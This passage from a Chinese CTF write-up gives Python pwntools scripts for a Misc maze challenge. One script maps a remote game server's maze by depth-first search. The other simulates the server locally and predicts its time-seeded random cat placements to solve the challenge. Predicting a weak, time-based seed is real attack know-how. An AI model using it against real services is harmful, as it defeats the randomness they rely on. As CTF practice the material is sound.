class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">NOTHING = <span class="number">0</span></span><br><span class="line">WALL = <span class="number">1</span></span><br><span class="line">BOMB = <span class="number">2</span></span><br><span class="line">CAT = <span class="number">3</span></span><br><span class="line">PERSON = <span class="number">4</span></span><br><span class="line">directions = [<span class="string">'u'</span>, <span class="string">'d'</span>, <span class="string">'l'</span>, <span class="string">'r'</span>]</span><br><span class="line">dic = &#123;<span class="string">'u'</span>:<span class="string">'d'</span>,<span class="string">'d'</span>:<span class="string">'u'</span>,<span class="string">'r'</span>:<span class="string">'l'</span>,<span class="string">'l'</span>:<span class="string">'r'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在迷宫中判断下一个节点是否可以去或者探索未知节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">turn</span><span class="params">(game,map,direction,x,y)</span>:</span></span><br><span class="line"></span><br><span class="line">    status = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">"u"</span>:</span><br><span class="line">        tmp_x = x - <span class="number">1</span></span><br><span class="line">        tmp_y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">"d"</span>:</span><br><span class="line">        <span class="keyword">if</span> x == len(map) - <span class="number">1</span>:</span><br><span class="line">            map.append([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map[<span class="number">0</span>]))])</span><br><span class="line">        tmp_x = x + <span class="number">1</span></span><br><span class="line">        tmp_y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">'l'</span>:</span><br><span class="line">        tmp_y = y - <span class="number">1</span></span><br><span class="line">        tmp_x = x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y == len(map[<span class="number">0</span>]) <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> map:</span><br><span class="line">                i.append(<span class="number">0</span>)</span><br><span class="line">        tmp_x = x</span><br><span class="line">        tmp_y = y + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> map[tmp_x][tmp_y] == NOTHING:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            game.sendline(direction)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            infor = game.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"recvError!!!"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"WALL"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            map[tmp_x][tmp_y] = WALL</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"BOMB"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            map[tmp_x][tmp_y] = BOMB</span><br><span class="line">            x = tmp_x</span><br><span class="line">            y = tmp_y</span><br><span class="line">            status = <span class="string">"BOOM"</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"Caught"</span> <span class="keyword">in</span> infor <span class="keyword">or</span> <span class="string">"OK"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            map[tmp_x][tmp_y] = NOTHING</span><br><span class="line">            x = tmp_x</span><br><span class="line">            y = tmp_y</span><br><span class="line">            status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error or flag: "</span>,infor)</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> map[tmp_x][tmp_y] == WALL:</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> map[tmp_x][tmp_y] == BOMB:</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"ukown"</span>,map[tmp_x][tmpp_y],tmp_x,tmp_y)</span><br><span class="line">        <span class="keyword">return</span> map,x,y,status</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># 加载已保存的地图数据 与 初始化地图 二选一</span></span><br><span class="line"><span class="string">map = [[] for i in range(60)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pic = Image.open('./map.png')</span></span><br><span class="line"><span class="string">w,h = pic.size</span></span><br><span class="line"><span class="string">for i in range(h):</span></span><br><span class="line"><span class="string">    for j in range(w):</span></span><br><span class="line"><span class="string">        pixel = pic.getpixel((j,i))</span></span><br><span class="line"><span class="string">        if pixel == (0,0,0) or pixel == (255,0,0):</span></span><br><span class="line"><span class="string">            map[i].append(WALL)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            map[i].append(NOTHING)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 初始化迷宫地图 与 加载保存一半的地图信息 二选一</span></span><br><span class="line">map = [[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]]</span><br><span class="line"><span class="comment"># 初始化栈</span></span><br><span class="line">stack = [[<span class="number">1</span>,<span class="number">1</span>,[<span class="string">'r'</span>,<span class="string">'d'</span>],]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    game = remote(<span class="string">"59.110.63.160"</span>, <span class="number">40001</span>)</span><br><span class="line"></span><br><span class="line">    x,y = <span class="number">1</span>,<span class="number">1</span> ; exit = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            pos = stack[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> [x,y] == pos[:<span class="number">2</span>]:</span><br><span class="line">                tmp_directions = []</span><br><span class="line">                tmp_directions.extend(pos[<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> direction <span class="keyword">in</span> pos[<span class="number">2</span>]:</span><br><span class="line">                    map,tmp_x,tmp_y,status = turn(game,map,direction,x,y)</span><br><span class="line">                    tmp_directions.remove(direction)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> status == <span class="literal">True</span>:</span><br><span class="line">                        x,y = tmp_x,tmp_y</span><br><span class="line">                        stack[<span class="number">-1</span>][<span class="number">2</span>] = tmp_directions</span><br><span class="line">                        tmp = []</span><br><span class="line">                        tmp.extend(directions)</span><br><span class="line">                        tmp.remove(dic[direction])</span><br><span class="line">                        stack.extend([[x,y,tmp,dic[direction]]])</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> status == <span class="string">"BOOM"</span>:</span><br><span class="line">                        x,y = tmp_x,tmp_y</span><br><span class="line">                        stack[<span class="number">-1</span>][<span class="number">2</span>] = tmp_directions</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">"BOOM!!!"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    map,x,y,status = turn(game,map,pos[<span class="number">-1</span>],x,y)</span><br><span class="line">                    stack.pop()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重连之后走回到上次遇见炸弹前的节点</span></span><br><span class="line">            <span class="keyword">elif</span> [x,y] == [<span class="number">1</span>,<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> stack[<span class="number">1</span>:]:</span><br><span class="line">                    map,x,y,status = turn(game,map,dic[i[<span class="number">3</span>]],x,y)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"ukown: "</span>,[x,y])</span><br><span class="line">                pause()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit = <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        game.close()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 保存迷宫地图信息</span></span><br><span class="line">        img = Image.new(<span class="string">"RGB"</span>,(len(map[<span class="number">0</span>]),len(map)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(map[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> map[i][j] == <span class="number">0</span>:</span><br><span class="line">                    img.putpixel((j,i),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">                <span class="keyword">elif</span> map[i][j] == <span class="number">1</span>:</span><br><span class="line">                    img.putpixel((j,i),<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> map[i][j] == <span class="number">2</span>:</span><br><span class="line">                    img.putpixel((j,i),(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(img.size)</span><br><span class="line">        img.save(<span class="string">"map_1.png"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> exit == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesmap_1.png" alt="map_1"></p><p>遍历出地图之后，利用题目源码写抓猫算法。（ps：就是本地模拟服务器程序运行状态，random的seed是由连接题目程序时的时间决定的，seed已知，本地模拟服务器状态，深度优先求解<code>PERSON</code>与<code>CAT</code>的最短路径，这里因为嫌麻烦不想再该刚刚遍历地图的脚本了就选择了去网上找个现成的轮子，结果拿回来各种调试修bug，一个下午又被浪费了emmm 最后恼羞成怒又写了个轮子哭唧唧）</p><p>另外，出题人的服务器就离谱！！！此处疯狂diss出题人，第一天晚上做题的时候刚开始做就发现题目挂了，被迫睡大觉，第二天题目好了，但是服务器的时区延时是认真的么，不给时区信息的同时，服务器本地时间还比北京时间快了整整两秒！！！</p><p>其实本来网上的轮子也没啥，它的问题就那么一丢，本体调试几遍就能用了，但是跑flag的时候和服务器的输出一直对不上，结果一直在调试脚本找本地的bug，结果最后才知道本地已经完美了，数据对不上是服务器的<code>seed</code>比本地延时了2s！！！淦！ping服务器，响应延迟只有不到20ms，当时因为想着出题人没给提示应该是默认北京时区互联网时间，所以做多也就试了把本地模拟服务器的时间种子值加1，依旧不对。最后突然试了下加2对了。不说了，我是fw TAT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python -u</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> dfs</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTHING = <span class="number">0</span></span><br><span class="line">WALL = <span class="number">1</span></span><br><span class="line">BOMB = <span class="number">2</span></span><br><span class="line">CAT = <span class="number">3</span></span><br><span class="line">PERSON = <span class="number">4</span></span><br><span class="line">dic = dfs.dic</span><br><span class="line">directions = [<span class="string">'u'</span>, <span class="string">'d'</span>, <span class="string">'l'</span>, <span class="string">'r'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randint</span><span class="params">(start, end)</span>:</span></span><br><span class="line">    m = end - start + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(<span class="number">16</span>) % m + start</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, map)</span>:</span></span><br><span class="line">        self.seed = int(time.time()) + <span class="number">2</span></span><br><span class="line">        random.seed(self.seed)</span><br><span class="line">        self.map = map</span><br><span class="line">        self.n = len(self.map)</span><br><span class="line">        self.x = <span class="number">1</span></span><br><span class="line">        self.y = <span class="number">1</span></span><br><span class="line">        self.cx = <span class="number">0</span></span><br><span class="line">        self.cy = <span class="number">0</span></span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line">        self.placeCat(firsttime = <span class="literal">True</span>)</span><br><span class="line">        self.time = <span class="number">0</span></span><br><span class="line">        self.persontime = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">placeCat</span><span class="params">(self, firsttime = False)</span>:</span></span><br><span class="line">        tmpmap = copy.deepcopy(self.map)</span><br><span class="line">        tmpmap[self.x][self.y] = PERSON</span><br><span class="line">        tmpmap[self.cx][self.cy] = CAT</span><br><span class="line">        <span class="keyword">if</span> firsttime:</span><br><span class="line">            i = self.n - <span class="number">2</span></span><br><span class="line">            j = self.n - <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> tmpmap[i][j] != NOTHING:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">            self.cx = i</span><br><span class="line">            self.cy = j</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            j = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">while</span> tmpmap[i][j] != NOTHING:</span><br><span class="line">                i = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">                j = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            self.cx = i</span><br><span class="line">            self.cy = j</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(self, c, p)</span>:</span></span><br><span class="line">        self.time += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.time &gt; <span class="number">4000</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"DARKFLAMEMASTER"</span></span><br><span class="line">            sys.exit(<span class="number">-1</span>)</span><br><span class="line">        tmpmap = copy.deepcopy(self.map)</span><br><span class="line">        tmpmap[self.x][self.y] = PERSON</span><br><span class="line">        tmpmap[self.cx][self.cy] = CAT</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p == PERSON:</span><br><span class="line">            x = self.x</span><br><span class="line">            y = self.y</span><br><span class="line">        <span class="keyword">elif</span> p == CAT:</span><br><span class="line">            x = self.cx</span><br><span class="line">            y = self.cy</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">'u'</span>:</span><br><span class="line">            y -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">'d'</span>:</span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">'l'</span>:</span><br><span class="line">            x -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">'r'</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p == PERSON:</span><br><span class="line">            self.persontime += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> tmpmap[x][y] == WALL:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"WALL."</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> tmpmap[x][y] == BOMB:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"BOMB."</span></span><br><span class="line">                sys.exit(<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">elif</span> tmpmap[x][y] == CAT:</span><br><span class="line">                self.count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self.count == <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">print</span> self.time</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"SUCCESS!!!"</span></span><br><span class="line">                self.x = x</span><br><span class="line">                self.y = y</span><br><span class="line">                self.placeCat()</span><br><span class="line">                <span class="comment">#print "Caught!"</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.x = x</span><br><span class="line">                self.y = y</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"OK."</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> p == CAT:</span><br><span class="line">            <span class="keyword">if</span> tmpmap[x][y] == NOTHING:</span><br><span class="line">                self.cx = x</span><br><span class="line">                self.cy = y</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self,direction)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> direction <span class="keyword">not</span> <span class="keyword">in</span> directions:</span><br><span class="line">            sys.exit(<span class="number">-1</span>)</span><br><span class="line">        self.move(direction, PERSON)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.persontime % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                choice = randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">                direction = directions[choice]</span><br><span class="line">                randcount = <span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span> self.move(direction, CAT) == <span class="literal">False</span>:</span><br><span class="line">                    choice = randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">                    direction = directions[choice]</span><br><span class="line">                    randcount += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> randcount == <span class="number">10</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">map = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">60</span>)]</span><br><span class="line"></span><br><span class="line">pic = Image.open(<span class="string">'./map_2.png'</span>)</span><br><span class="line">w,h = pic.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(w):</span><br><span class="line">        pixel = pic.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel == (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">or</span> pixel == (<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">            map[i].append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            map[i].append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">time_1 = int(time.time())</span><br><span class="line">sh = remote(<span class="string">"59.110.63.160"</span>,<span class="number">40001</span>)</span><br><span class="line"><span class="comment">#sh = remote("127.0.0.1",10002)</span></span><br><span class="line">game = Game(map)</span><br><span class="line">time_2 = int(time.time())</span><br><span class="line"><span class="comment">#sleep(0.3)</span></span><br><span class="line"><span class="comment">#print(sh.recv(),game.seed)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> time_1 != time_2:</span><br><span class="line">    print(time_1,time_2)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = dfs.dfs_fun(map,(game.x,game.y),(game.cx,game.cy))</span><br><span class="line">    num = [<span class="number">4000</span>,<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> len(i) &lt; num[<span class="number">0</span>]:</span><br><span class="line">            num[<span class="number">0</span>] = len(i)</span><br><span class="line">            num[<span class="number">1</span>] = path.index(i)</span><br><span class="line">    path = path[num[<span class="number">1</span>]] ; path = path[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">        direction = dic[i[<span class="number">-1</span>]]</span><br><span class="line">        tmp_num = int(game.count)</span><br><span class="line">        game.start(direction)</span><br><span class="line">        sh.sendline(direction)</span><br><span class="line">        <span class="comment">#sleep(0.1)</span></span><br><span class="line">        infor = sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">print</span> infor</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Caught"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Caught"</span> <span class="keyword">not</span> <span class="keyword">in</span> infor <span class="keyword">and</span> <span class="string">"OK"</span> <span class="keyword">not</span> <span class="keyword">in</span> infor:</span><br><span class="line"></span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> game.count == <span class="number">10</span>:</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> game.count - tmp_num == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Misc" scheme="http://xibai.xyz/categories/Misc/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Misc" scheme="http://xibai.xyz/tags/Misc/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>2021-CISCN-First-Other</title>
    <link href="http://xibai.xyz/2020/05/16/2021-ciscn-first/"/>
    <id>http://xibai.xyz/2020/05/16/2021-ciscn-first/</id>
    <published>2020-05-16T03:51:11.000Z</published>
    <updated>2021-05-16T05:42:19.749Z</updated>
    
